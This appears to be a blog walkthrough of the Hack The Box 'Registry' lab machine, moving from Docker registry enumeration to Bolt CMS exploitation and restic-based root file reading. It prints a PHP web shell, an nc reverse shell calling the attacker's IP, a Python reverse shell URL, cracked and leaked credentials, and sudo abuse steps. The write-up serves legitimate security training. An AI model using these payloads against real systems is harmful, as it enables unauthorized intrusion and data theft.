---
layout: post
title:  "Hack the box Registry Walkthrough"
date:   2020-04-04
categories: challenge
tags: HACKTHEBOX | DOCKER | BOLT | CMS | REGISTRY | HARD
description: My walkthrough for hack the box - Register
image: "/img/jekyll/8/banner.png"
---

<small> <i> Tags: HACKTHEBOX | DOCKER | BOLT | CMS | REGISTRY | HARD </i> </small>

## Nmap
``` 
nmap 10.10.10.159 -sV -sC -oA scan/stdscan 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 08:53 EDT
Nmap scan report for 10.10.10.159
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Running ```nmap```we can spot three services running

* SSH 22/TCP
* HTTP 80/TCP
* HTTPS 443/TCP

There's a very importante information being leaked at the SSL Certificate, a subdomain ```docker.registry.htb```.

So let's update our ```/etc/hosts/```file

```
danps@pwnbox:~/hackthebox$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox
10.10.10.159    registry.htb docker.registry.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```



## registry.htb

Going into the main website we see just this default nginx page. I used a tool called ```rustbuster```to find some new directories.

```
danps@pwnbox:~/hackthebox$ rustbuster dir -u "http://registry.htb" -w /usr/share/wordlists/dirb/common.txt  --no-banner
~ rustbuster v3.0.3 ~ by phra & ps1dr3x ~

[?] Started at	: 2020-04-03 09:12:32

GET	200 OK				http://registry.htb/
GET     403 Forbidden                   http://registry.htb/.bash_history
GET     403 Forbidden                   http://registry.htb/.hta
GET     403 Forbidden                   http://registry.htb/.htaccess
GET     403 Forbidden                   http://registry.htb/.htpasswd
GET     200 OK                          http://registry.htb/index.html
GET     301 Moved Permanently           http://registry.htb/install
						=> http://registry.htb/install/
  [00:00:51] ########################################    4611/4611    ETA: 00:00:00 req/s: 90
```

![registry_main_install](/img/jekyll/8/registry_main_install.png){:class="img-responsive"}

```rustbuster``` found a ```/install``` directory. Browsing there, we find a bunch o gibberish that's clearly a file, we can download with ```curl```and save it locally.

```bash
curl http://registry.htb/install/ -s > install
```

Extracting the file we just got, we see two files

* Readme.md
* ca.crt

```
danps@pwnbox:~/hackthebox/registry$ cat readme.md 
# Private Docker Registry

- https://docs.docker.com/registry/deploying/
- https://docs.docker.com/engine/security/certificates/
danps@pwnbox:~/hackthebox/registry$ cat ca.crt 
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
-----END CERTIFICATE-----
```

The first one we see some links about ```docker registry``` , and the ```ca.crt```is a file that allow us to login to this private registry? We still don't know.

## docker.registry.htb

![docker_registry](/img/jekyll/8/docker_registry.png){:class="img-responsive"}

Another blank page, running ```rustbuster```again.

```terminal
danps@pwnbox:~/hackthebox/registry$ rustbuster dir -u "http://docker.registry.htb/" -w /usr/share/wordlists/dirb/common.txt  --no-banner
~ rustbuster v3.0.3 ~ by phra & ps1dr3x ~

[?] Started at	: 2020-04-03 10:47:24

GET	200 OK				                      http://docker.registry.htb/
GET     301 Moved Permanently           http://docker.registry.htb/v2
						=> /v2/
  [00:00:51] ########################################    4611/4611    ETA: 00:00:00 req/s: 90
```

We find a ```v2```directory.

![registry_v2](/img/jekyll/8/registry_v2.png){:class="img-responsive"}

It ask us for a ```user```and ```password```. I think this part was a bit of guessing but the first thing that I always try is ```admin:admin``` and this time it worked.

![registry_empty](/img/jekyll/8/registry_empty.png){:class="img-responsive"}

But we only get these empty curly braces.

## Docker Login

Knowing that we're dealing with a ```docker registry``` we can try to login to this and check out its images.

```
danps@pwnbox:~/hackthebox/registry$ sudo docker login docker.registry.htb
Username: admin
Password: 
Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority
```

According to the official docker documentation, we need to add some valid certificates to make it work

```
/etc/docker/certs.d/           <-- Certificate directory
    └── docker.registry.htb    <-- Hostname:port
       ├── client.cert         <-- Client certificate
       ├── client.key          <-- Client key
       └── ca.crt              <-- Certificate authority that signed
                                    the registry certificate (the one we extracted from            																																		the install zip)
```

First, we generate our client certificate

```bash
openssl genrsa -out client.key 4096
openssl req -new -x509 -text -key client.key -out client.cert
```

Now we create a folder inside ```certs.d``` and move the certificates. In the end it should look like this

```
danps@pwnbox:/etc/docker/certs.d$ tree
.
└── docker.registry.htb
    ├── ca.crt
    ├── client.cert
    └── client.key

1 directory, 3 files
```

If we try to login again, we succeed

```
danps@pwnbox:~/hackthebox/registry/certs$ sudo docker login docker.registry.htb
Username: admin
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
```

To find what images are stored in this register we can browse to ```_catalog``` inside the ```/v2```dir.

![registry_bolt-image](/img/jekyll/8/registry_bolt-image.png){:class="img-responsive"}

We discover a ```bolt-image```, let's pull and run it locally.

```bash
sudo docker pull docker.registry.htb/bolt-image
```

```
danps@pwnbox:~/hackthebox/registry$ sudo docker images
REPOSITORY                       TAG                 IMAGE ID            CREATED             SIZE
docker.registry.htb/bolt-image   latest              601499e98a60        10 months ago       362MB
```

Now let's enumerate it to see if we find any valid credentials.

```bash
sudo docker run -it docker.registry.htb/bolt-image
```

Inside the container we can see a ```.ssh```file inside the ```root``` directory.

Looking at the the ```id_rsa.pub``` file we can see an user ```bolt```. Another interesting file is ```id_rsa``` which contains the bolt user's private key, however it is encrypted.

```
root@870d4f2aab64:~/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9
```

At first I thought I had to brute force this, but it did not work so I went back to enumerate more the machine.

Looking at the ```.viminfo```file inside the ```root```directory I noticed some references to ```/etc/profile.d/01-ssh.sh```.

```
root@870d4f2aab64:~# cat /etc/profile.d/01-ssh.sh 
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

It turned out to be a script to add and put the password to the ```id_rsa```

Credentials

*  bolt
* id_rsa
  * GkOcz221Ftb3ugog

Let's login.

```
danps@pwnbox:~/hackthebox/registry$ ssh -i id_rsa bolt@registry.htb
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri Apr  3 15:54:38 UTC 2020

  System load:  0.0               Users logged in:                0
  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 23%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    154
Last login: Fri Apr  3 15:53:46 2020 from 10.10.14.38
bolt@bolt:~$ 
```

Now that we're inside, let's fetch our ```user.txt```.

```bash
bolt@bolt:~$ cat user.txt
ytc0ytdmnz<redacted>
```

## Privilege Escalation

I always like to initiate this part running some default enumeration scripts to get some general idea of what I have to do. In this case I discovered that ```bolt```is actually a content management system (CMS). There are a few interesting files that we have to analyze to figure out our attack plan.

Browsing the ```/var/www/html```folder, we see an interesting file called ```backup.php``` which has the following script

```php
<?php 
  shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

When I saw this, I realized that the user ```www-data```can run ```restic```as root without a password. So the current attack plan is:

1. Exploit the bolt website to get a shell as ```www-data``` 
2. Confirm the theory about ```restic```
3. Exploit ```restic```to read the root.txt file

## Exploiting Bolt CMS

Googling a bit about bolt RCEs, I found this great [article](https://fgsec.net/from-csrf-to-rce-bolt-cms/) that says that basically an authanticated user can write to a ```config.yml```and change the file extensions that the application allows us to upload.But before we get there we need some admin credentials to login.

Searching the web files and configs, we find a ```/var/www/html/bolt/app/database/bolt.db```which is very likely to have our credential stored.

```bash
strings /var/www/html/bolt/app/database/bolt.db
```

we find 

```
admin $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
```

Which looks like a username and a hashed password. Running it in ```John the ripper```It says it is a bcrypt hash and using ```rockyou.txt``` for a dictionary attack we find the password ```strawberry```.

```
john hash -w /usr/share/wordlists/rockyou.txt --format=bcrypt
```

**Credentials**:

* admin
* strawberry

And we login

![registry_bolt_login](/img/jekyll/8/registry_bolt_login.png){:class="img-responsive"}

Now we just replay the steps desribed in the article I mentioned. First we need to change the ```accepted_file_types```in the config.yml file.

![registry_edit](/img/jekyll/8/registry_edit.png){:class="img-responsive"}

We just add ```php``` to this list and now we can upload php files.

One thing that is important to point out is that this particular box is not allowing us to make outbounds connections, which means that if I create a file to get a reverse shell, it would be something like this:

```php
<?php  
system("nc 10.10.14.38 9091 -e /bin/bash");
?>
```

But since there's this protection this would just fail. I struggled a bit to realize that I didn't actually had to leave the box. Since I had a decent SSH Shell, I could just start a netcat listener on the box and connect to it using localhost.

``` php
<?php  
system($_GET['cmd']);
?>
```

``` 
http://registry.htb/bolt/files/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22localhost%22,9091));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
```

Let's upload a file here

![registry_upload](/img/jekyll/8/registry_upload.png){:class="img-responsive"}

We fire up our netcat on the registry machine on port 9091 and get our new shell!

Ok, we are ```www-data```now

```
www-data@bolt:~/html/bolt/files$ whoami
whoami
www-data
www-data@bolt:~/html/bolt/files$ 
```

To confirm out theory about ```www-data``` and ```restic```we run ```sudo -l```

``` 
www-data@bolt:~/html/bolt/files$ sudo -l
sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

We can now be sure that www-data can run **/usr/bin/restic backup -r rest** as root without a password. 

## Backup and dump root.txt file

Now is the the part where I had to do a ton of research to understand this program. First I read the [documentation](https://restic.readthedocs.io/en/latest/) for restic.

```l
Restic is a fast and secure backup program. 
```

That's what the introduction tells us. Reading through the docs, I noticed two important thing:

- We can user a rest server as a repository
- We can dump the files that we backed up to standard output (stdout) 

Which gave me the idea that I had an arbitrary read on the server

I found this [Github](https://github.com/restic/rest-server) that has the binaries for running a rest server locally (Remember we can't make outbounds connections). I transferred the file using over ```ssh``` and started a server locally on the port 8000

```
bolt@bolt:/dev/shm/server$ ../rest-server --path ${PWD}
Data directory: /dev/shm/server
Authentication disabled
Private repositories disabled
Starting server on :8000
```

We need to create a repository on this server to stored the backup data.

```
bolt@bolt:/dev/shm/server$ restic init --repo rest:http://localhost:8000/
enter password for new repository: 
enter password again: 
created restic repository 417ad86527 at rest:http://localhost:8000/
```

Now that our repository is set, let's send the root.txt file

```
www-data@bolt:/dev/shm/ sudo /usr/bin/restic backup -r rest:http://localhost:8000/ -p pass_file /root/root.txt
```

**We need to pass the -p argument because we're not in a full tty shell, so if the program asks for an input (stdin) we would just lose our shell. The pass_file contains the password we set when we created the repository**

Now that our flag is in our repository we just need to dump it

```
bolt@bolt:/dev/shm$ restic -r rest:http://localhost:8000/ snapshots
enter password for repository: 
password is correct
ID        Date                 Host        Tags        Directory
----------------------------------------------------------------------
e8ce5ed2  2020-04-04 04:53:01  bolt                    /root/root.txt
----------------------------------------------------------------------
1 snapshots
```

```
bolt@bolt:/dev/shm$ restic dump -r rest:http://localhost:8000/ e8ce5ed2 root.txt
enter password for repository: 
password is correct
ntrkzgnkota<redacted>
```

Hope you enjoyed it  :-)

by me